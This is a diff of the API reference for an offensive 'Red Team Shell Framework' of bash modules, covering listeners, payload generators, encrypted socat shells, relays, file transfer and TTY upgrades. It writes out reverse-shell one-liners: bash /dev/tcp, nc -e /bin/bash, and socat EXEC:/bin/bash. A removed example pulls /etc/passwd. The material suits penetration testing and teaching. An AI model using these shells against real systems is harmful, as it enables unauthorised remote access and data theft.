@@ -1,524 +1,353 @@
-# 📚 API Reference
+# API Reference
 
-Complete API reference for all Red Team Shell Framework modules.
+Function reference for all modules and core utilities.
 
 ---
 
 ## Table of Contents
 
-1. [Core Framework](#core-framework)
-2. [Listeners Module](#listeners-module)
-3. [Shells Module](#shells-module)
-4. [Encryption Module](#encryption-module)
-5. [Transfer Module](#transfer-module)
-6. [Relay Module](#relay-module)
-7. [Upgrade Module](#upgrade-module)
-8. [Logger Module](#logger-module)
+1. [utils.sh — Core Utilities](#utilssh--core-utilities)
+2. [config.sh — Configuration](#configsh--configuration)
+3. [listeners.sh](#listenerssh)
+4. [shells.sh](#shellssh)
+5. [encrypt.sh](#encryptsh)
+6. [transfer.sh](#transfersh)
+7. [relay.sh](#relaysh)
+8. [upgrade.sh](#upgradesh)
 
 ---
 
-## Core Framework
+## utils.sh — Core Utilities
 
-### Framework Functions
+Sourced by `shellmaster.sh` before any module. All functions available globally.
 
-#### `display_menu()`
-Displays the main CLI menu.
+### Color functions
 
-**Syntax:**
+| Function | Output |
+|----------|--------|
+| `color_red "text"` | Red text |
+| `color_green "text"` | Green text |
+| `color_yellow "text"` | Yellow text |
+| `color_cyan "text"` | Cyan text |
+| `color_blue "text"` | Blue text |
+
+Respects `CLI_COLORS` — when set to `false`, returns plain text.
+
+### Message helpers
+
+| Function | Prefix | Stream |
+|----------|--------|--------|
+| `success_msg "text"` | `✓` green | stdout |
+| `error_msg "text"` | `✗` red | stderr |
+| `warn_msg "text"` | `⚠` yellow | stdout |
+| `info_msg "text"` | `ℹ` cyan | stdout |
+
+### Logging functions
+
+Write JSON entries to `$LOG_FILE`. Only write when `LOG_LEVEL` permits.
+
 ```bash
-display_menu
+log_debug "message"   # LOG_LEVEL=DEBUG only
+log_info  "message"   # DEBUG or INFO
+log_warn  "message"   # DEBUG, INFO, or WARN
+log_error "message"   # Always
 ```
 
-**Example:**
-```bash
-$ display_menu
-```
-
----
-
-#### `load_module(module_name)`
-Loads a framework module.
-
-**Syntax:**
-```bash
-load_module "module_name"
-```
-
-**Parameters:**
-- `module_name` (string): Name of module to load
-
-**Example:**
-```bash
-load_module "listeners"
-load_module "shells"
-```
-
----
-
-## Listeners Module
-
-Location: `modules/listeners.sh`
-
-### Functions
-
-#### `create_reverse_listener(port, log_file, rlwrap_enabled)`
-Creates a reverse shell listener.
-
-**Syntax:**
-```bash
-create_reverse_listener [port] [log_file] [rlwrap_enabled]
-```
-
-**Parameters:**
-- `port` (int, required): Port to listen on
-- `log_file` (string, optional): Path to log file
-- `rlwrap_enabled` (bool, optional): Enable rlwrap history (true/false)
-
-**Returns:**
-- 0 on success
-- 1 on error
-
-**Example:**
-```bash
-source modules/listeners.sh
-create_reverse_listener 4444 logs/session.log true
-```
-
-**Output:**
-```
-[*] Listening on port 4444...
-[+] New connection from 192.168.1.100!
-```
-
----
-
-#### `create_bind_listener(port, log_file, command)`
-Creates a bind shell listener.
-
-**Syntax:**
-```bash
-create_bind_listener [port] [log_file] [command]
-```
-
-**Parameters:**
-- `port` (int, required): Port to listen on
-- `log_file` (string, optional): Path to log file
-- `command` (string, optional): Command to execute
-
-**Returns:**
-- 0 on success
-- 1 on error
-
-**Example:**
-```bash
-source modules/listeners.sh
-create_bind_listener 4445 logs/bind.log /bin/bash
-```
-
----
-
-## Shells Module
-
-Location: `modules/shells.sh`
-
-### Functions
-
-#### `generate_bash_payload(ip, port, format)`
-Generates a bash reverse shell payload.
-
-**Syntax:**
-```bash
-generate_bash_payload [ip] [port] [format]
-```
-
-**Parameters:**
-- `ip` (string, required): Target IP address
-- `port` (int, required): Target port
-- `format` (string, optional): Output format (plain, base64, url)
-
-**Returns:**
-- Payload string
-
-**Example:**
-```bash
-source modules/shells.sh
-PAYLOAD=$(generate_bash_payload "192.168.1.100" 4444 "base64")
-echo $PAYLOAD
-```
-
-**Output:**
-```
-YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==
-```
-
----
-
-#### `generate_powershell_payload(ip, port, format)`
-Generates a PowerShell reverse shell payload.
-
-**Syntax:**
-```bash
-generate_powershell_payload [ip] [port] [format]
-```
-
-**Parameters:**
-- `ip` (string, required): Target IP address
-- `port` (int, required): Target port
-- `format` (string, optional): Output format (plain, base64, url)
-
-**Returns:**
-- Payload string
-
-**Example:**
-```bash
-source modules/shells.sh
-PAYLOAD=$(generate_powershell_payload "192.168.1.100" 4444 "base64")
-```
-
----
-
-#### `generate_python_payload(ip, port, format)`
-Generates a Python reverse shell payload.
-
-**Syntax:**
-```bash
-generate_python_payload [ip] [port] [format]
-```
-
-**Parameters:**
-- `ip` (string, required): Target IP address
-- `port` (int, required): Target port
-- `format` (string, optional): Output format (plain, base64, url)
-
-**Returns:**
-- Payload string
-
----
-
-## Encryption Module
-
-Location: `modules/encrypt.sh`
-
-### Functions
-
-#### `create_socat_ssl_listener(port, cert_file, key_file, command)`
-Creates an SSL-encrypted listener using socat.
-
-**Syntax:**
-```bash
-create_socat_ssl_listener [port] [cert_file] [key_file] [command]
-```
-
-**Parameters:**
-- `port` (int, required): Port to listen on
-- `cert_file` (string, required): Certificate file path
-- `key_file` (string, required): Private key file path
-- `command` (string, optional): Command to execute
-
-**Returns:**
-- 0 on success
-- 1 on error
-
-**Example:**
-```bash
-source modules/encrypt.sh
-create_socat_ssl_listener 4444 certs/cert.pem certs/key.pem /bin/bash
-```
-
----
-
-#### `generate_self_signed_cert(output_cert, output_key, days, bits)`
-Generates a self-signed certificate.
-
-**Syntax:**
-```bash
-generate_self_signed_cert [output_cert] [output_key] [days] [bits]
-```
-
-**Parameters:**
-- `output_cert` (string, required): Output certificate file path
-- `output_key` (string, required): Output key file path
-- `days` (int, optional): Certificate validity in days (default: 365)
-- `bits` (int, optional): RSA key size (default: 2048)
-
-**Returns:**
-- 0 on success
-- 1 on error
-
-**Example:**
-```bash
-source modules/encrypt.sh
-generate_self_signed_cert certs/cert.pem certs/key.pem 365 4096
-```
-
----
-
-## Transfer Module
-
-Location: `modules/transfer.sh`
-
-### Functions
-
-#### `secure_download(remote_host, remote_path, local_path, username)`
-Downloads a file securely using SCP.
-
-**Syntax:**
-```bash
-secure_download [remote_host] [remote_path] [local_path] [username]
-```
-
-**Parameters:**
-- `remote_host` (string, required): Remote host IP/hostname
-- `remote_path` (string, required): File path on remote system
-- `local_path` (string, required): Local destination path
-- `username` (string, required): Username for SSH
-
-**Returns:**
-- 0 on success
-- 1 on error
-
-**Example:**
-```bash
-source modules/transfer.sh
-secure_download 192.168.1.100 /etc/passwd ./passwd.txt root
-```
-
----
-
-#### `secure_upload(local_path, remote_host, remote_path, username)`
-Uploads a file securely using SCP.
-
-**Syntax:**
-```bash
-secure_upload [local_path] [remote_host] [remote_path] [username]
-```
-
-**Parameters:**
-- `local_path` (string, required): Local file path
-- `remote_host` (string, required): Remote host IP/hostname
-- `remote_path` (string, required): Destination path on remote
-- `username` (string, required): Username for SSH
-
-**Returns:**
-- 0 on success
-- 1 on error
-
-**Example:**
-```bash
-source modules/transfer.sh
-secure_upload ./shell.sh 192.168.1.100 /tmp/shell.sh root
-```
-
----
-
-#### `verify_checksum(file_path, expected_hash, algorithm)`
-Verifies file integrity using checksum.
-
-**Syntax:**
-```bash
-verify_checksum [file_path] [expected_hash] [algorithm]
-```
-
-**Parameters:**
-- `file_path` (string, required): Path to file
-- `expected_hash` (string, required): Expected hash value
-- `algorithm` (string, optional): Algorithm (sha256, md5, sha1)
-
-**Returns:**
-- 0 if match
-- 1 if mismatch
-
-**Example:**
-```bash
-source modules/transfer.sh
-verify_checksum ./payload.sh "abc123def456" "sha256"
-```
-
----
-
-## Relay Module
-
-Location: `modules/relay.sh`
-
-### Functions
-
-#### `create_relay(listen_port, forward_host, forward_port)`
-Creates a relay to forward connections.
-
-**Syntax:**
-```bash
-create_relay [listen_port] [forward_host] [forward_port]
-```
-
-**Parameters:**
-- `listen_port` (int, required): Port to listen on locally
-- `forward_host` (string, required): Host to forward to
-- `forward_port` (int, required): Port to forward to
-
-**Returns:**
-- 0 on success
-- 1 on error
-
-**Example:**
-```bash
-source modules/relay.sh
-create_relay 5555 192.168.2.100 4444
-```
-
----
-
-## Upgrade Module
-
-Location: `modules/upgrade.sh`
-
-### Functions
-
-#### `upgrade_to_pty(shell_path, user)`
-Upgrades shell to full interactive PTY.
-
-**Syntax:**
-```bash
-upgrade_to_pty [shell_path] [user]
-```
-
-**Parameters:**
-- `shell_path` (string, optional): Shell binary path
-- `user` (string, optional): User to run as
-
-**Returns:**
-- 0 on success
-- 1 on error
-
-**Example:**
-```bash
-source modules/upgrade.sh
-upgrade_to_pty /bin/bash root
-```
-
----
-
-## Logger Module
-
-Location: `modules/logger.sh`
-
-### Functions
-
-#### `log_session(action, status, details)`
-Logs a session action in JSON format.
-
-**Syntax:**
-```bash
-log_session [action] [status] [details]
-```
-
-**Parameters:**
-- `action` (string, required): Action type
-- `status` (string, required): Status (success/failure/warning)
-- `details` (JSON, optional): Additional details
-
-**Returns:**
-- 0 on success
-
-**Example:**
-```bash
-source modules/logger.sh
-log_session "listener_created" "success" '{"port": 4444, "type": "reverse"}'
-```
-
-**Output:**
+JSON format:
 ```json
-{"timestamp": "2026-02-25T10:30:45Z", "action": "listener_created", "status": "success", ...}
+{"timestamp":"2026-02-25T01:00:00Z","level":"INFO","message":"...","user":"root","pid":1234}
 ```
 
----
-
-## Utility Functions
-
-### Common Utility Functions
-
-#### `color_green(message)`
-Outputs message in green.
-
-**Syntax:**
-```bash
-color_green "Success message"
-```
-
----
-
-#### `color_red(message)`
-Outputs message in red.
-
-**Syntax:**
-```bash
-color_red "Error message"
-```
-
----
-
-#### `color_yellow(message)`
-Outputs message in yellow.
-
-**Syntax:**
-```bash
-color_yellow "Warning message"
-```
-
----
-
-## Return Codes
-
-All functions follow standard return codes:
-
-- `0` - Success
-- `1` - General error
-- `2` - Misuse of command
-- `126` - Command cannot execute
-- `127` - Command not found
-- `128+N` - Fatal error signal N
-
----
-
-## Configuration Variables
-
-### Global Variables
+### Session functions
 
 ```bash
-FRAMEWORK_DIR      # Framework root directory
-MODULES_DIR        # Modules directory
-LOGS_DIR           # Logs directory
-CERTS_DIR          # Certificates directory
-PAYLOADS_DIR       # Payloads directory
-SESSION_ID         # Current session ID
-LOG_FILE           # Main log file path
-VERSION            # Framework version
+generate_session_id
+# Returns: shell_<timestamp>_<random>
+# Example: shell_1708867275_28340
+
+create_session "$session_id" "$local_ip" "$local_port" "$remote_ip" "$remote_port"
+# Writes: logs/sessions/${session_id}.json
+
+log_session "$session_id" "$event" "$data"
+# Appends JSON event to logs/sessions/${session_id}.log
+
+list_sessions
+# Prints table of all sessions in logs/sessions/
 ```
 
----
-
-## Error Handling
-
-All functions provide error messages to STDERR:
+### Validation functions
 
 ```bash
-function example() {
-    if [[ $# -lt 2 ]]; then
-        echo "ERROR: Missing required arguments" >&2
-        return 1
-    fi
-}
+validate_ip "192.168.1.1"   # Returns 0 if valid IPv4, 1 if not
+validate_port "4444"         # Returns 0 if 1–65535, 1 if not
+```
+
+### File helpers
+
+```bash
+ensure_file "/path/to/file"   # Creates file if it doesn't exist
+ensure_dir  "/path/to/dir"    # Creates directory if it doesn't exist
 ```
 
 ---
 
-## Version
+## config.sh — Configuration
 
-- **API Version**: 1.0.0
-- **Framework Version**: 1.0.0
-- **Last Updated**: 2026-02-25
+Sourced by `shellmaster.sh`. Exports all variables and runs `init_framework()` automatically.
+
+### Exported variables
+
+| Variable | Default value | Purpose |
+|----------|--------------|---------|
+| `VERSION` | `1.0.0` | Framework version |
+| `FRAMEWORK_DIR` | Project root (auto-detected) | Base path |
+| `MODULES_DIR` | `$FRAMEWORK_DIR/modules` | Module files |
+| `LOGS_DIR` | `$FRAMEWORK_DIR/logs` | Log output |
+| `CERTS_DIR` | `$FRAMEWORK_DIR/certs` | SSL certificates |
+| `PAYLOADS_DIR` | `$FRAMEWORK_DIR/payloads` | Generated payloads |
+| `LOG_FILE` | `$LOGS_DIR/framework.log` | Main log file |
+| `LOG_LEVEL` | `INFO` | Logging verbosity |
+| `SESSION_DIR` | `$LOGS_DIR/sessions` | Session records |
+| `SESSION_PREFIX` | `shell_` | Session ID prefix |
+| `SESSION_TIMEOUT` | `3600` | Session timeout (seconds) |
+| `DEFAULT_CIPHER` | `aes-256-cbc` | Encryption cipher |
+| `KEY_SIZE` | `2048` | RSA key size (bits) |
+| `CERT_VALIDITY` | `365` | Certificate validity (days) |
+| `CLI_COLORS` | `true` | Enable colored output |
+
+### init_framework()
+
+Called automatically on source. Creates `logs/sessions/`, `certs/`, `payloads/`, and touches `LOG_FILE`.
 
 ---
 
-**For more information, see the module source files in the `modules/` directory.**
+## listeners.sh
+
+### listeners_menu()
+
+Entry point — called by main menu option `1`. Loops until user selects Back.
+
+### setup_reverse_listener()
+
+Prompts for port and rlwrap preference, creates a session, and starts an `nc`/`ncat` listener.
+
+```
+Prompts: listen IP (default 0.0.0.0), port (default 4444), use rlwrap [y/n]
+Creates: logs/sessions/<session_id>.json
+Starts:  nc -l -n -v -p <port>  (with optional rlwrap prefix)
+```
+
+### setup_bind_listener()
+
+Starts a bind shell listener (`nc -e /bin/bash`) in the background.
+
+```
+Prompts: port (default 4444), use rlwrap [y/n]
+Starts:  nc -l -n -v -p <port> -e /bin/bash &
+Outputs: PID of background listener
+```
+
+### list_listeners()
+
+Lists active `nc`/`ncat` processes via `ps`.
+
+### stop_listener()
+
+Prompts for a PID and sends SIGKILL.
 
 ---
+
+## shells.sh
+
+### shells_menu()
+
+Entry point — called by main menu option `2`.
+
+### generate_bash_payload()
+
+Prompts for attacker IP/port, optional Base64 encoding and obfuscation. Outputs:
+```bash
+bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
+```
+
+### generate_powershell_payload()
+
+Prompts for attacker IP/port, optional Base64 encoding. Outputs a TCP PowerShell reverse shell one-liner.
+
+### generate_python_payload()
+
+Prompts for IP/port and Python version (2 or 3). Outputs a `socket`+`pty.spawn` one-liner.
+
+### show_templates()
+
+Displays static one-liner reference table (Bash TCP, Bash UDP, Python PTY).
+
+### batch_generate()
+
+Prompts for one IP/port pair and writes all three payload types to `PAYLOADS_DIR` at once.
+
+### view_payloads()
+
+Lists all files in `PAYLOADS_DIR` with size, MD5, and creation date from `.meta` files.
+
+### prompt_save_payload()
+
+Prompts "Save to file? [y/n]". If yes, writes payload to `PAYLOADS_DIR/<filename>` and calls `save_payload_metadata()`.
+
+### save_payload_metadata()
+
+Writes a `.meta` JSON file alongside each saved payload:
+```json
+{"filename":"bash_192.168.1.1_4444.sh","created_at":"...","size":45,"md5":"abc123","user":"root"}
+```
+
+---
+
+## encrypt.sh
+
+### encrypt_menu()
+
+Entry point — called by main menu option `3`.
+
+### generate_cert()
+
+Generates a self-signed RSA-2048 certificate valid for 365 days and stores it in `CERTS_DIR`:
+
+```
+CERTS_DIR/bind.key  – private key
+CERTS_DIR/bind.crt  – certificate
+CERTS_DIR/bind.pem  – combined (key + cert, used by socat)
+```
+
+### start_socat_listener()
+
+Checks for `socat` and `openssl`. Generates cert if missing. Prompts for port and starts:
+```bash
+socat file:`tty`,raw,echo=0 OPENSSL-LISTEN:<port>,cert=<pem>,verify=0
+```
+
+### gen_socat_payload()
+
+Detects local IP via `hostname -I`. Prompts for LHOST/LPORT and outputs the target-side command:
+```bash
+socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:/bin/bash
+```
+
+### check_dependencies()
+
+Returns 1 with an error message if `socat` or `openssl` is not installed.
+
+---
+
+## transfer.sh
+
+### transfer_menu()
+
+Entry point — called by main menu option `4`.
+
+### upload_file()
+
+Prompts for local file path, remote user, remote host, remote destination path. Runs:
+```bash
+scp <local_file> <user>@<host>:<path>
+```
+
+### download_file()
+
+Prompts for remote user, remote host, remote file path, local save path. Runs:
+```bash
+scp <user>@<host>:<file> <local_path>
+```
+
+### verify_checksum()
+
+Prompts for a file path. Outputs MD5 and SHA256:
+```
+MD5:    <hash>
+SHA256: <hash>
+```
+
+Uses `md5sum`/`md5` and `sha256sum`/`shasum -a 256` with fallbacks.
+
+### view_transfer_history()
+
+Greps `LOG_FILE` for transfer-related entries and shows the last 20 lines.
+
+---
+
+## relay.sh
+
+### relay_menu()
+
+Entry point — called by main menu option `5`.
+
+### create_socat_relay()
+
+Prompts for listen port, forward host, and forward port. Starts in background:
+```bash
+socat TCP-LISTEN:<port>,fork,reuseaddr TCP:<host>:<port> &
+```
+Outputs the PID.
+
+### create_ssh_tunnel()
+
+Shows a sub-menu with three tunnel types:
+
+| Option | SSH flag | Use case |
+|--------|----------|---------|
+| 1 | `-L local:remote_host:remote_port` | Access remote service locally |
+| 2 | `-R remote:local_host:local_port` | Expose local service on remote |
+| 3 | `-D socks_port` | Dynamic SOCKS proxy |
+
+Runs `ssh ... -N -f` (background, no command).
+
+### list_active_relays()
+
+Lists active `socat` and `ssh -N` processes with PID and command.
+
+### stop_relay()
+
+Calls `list_active_relays()`, prompts for a PID, then sends SIGTERM.
+
+---
+
+## upgrade.sh
+
+### upgrade_menu()
+
+Entry point — called by main menu option `6`.
+
+### upgrade_pty_python()
+
+Displays step-by-step instructions for Python PTY upgrade:
+
+```
+Step 1 — on target:  python3 -c 'import pty; pty.spawn("/bin/bash")'
+Step 2 — attacker:   Ctrl+Z  then  stty raw -echo; fg
+Step 3 — on target:  export TERM=xterm-256color; stty rows N cols N
+```
+
+### upgrade_pty_script()
+
+Displays instructions using `script`:
+
+```
+Step 1 — on target:  script -qc /bin/bash /dev/null
+Step 2 — attacker:   Ctrl+Z  then  stty raw -echo; fg
+```
+
+Also shows the socat full-TTY alternative.
+
+### fix_environment()
+
+Displays paste-ready commands to fix a broken shell environment:
+```bash
+export TERM=xterm-256color
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+stty rows <N> cols <N>
+reset
+```
+
+### enable_terminal_features()
+
+Displays commands to enable history, coloured prompt, and tab completion.
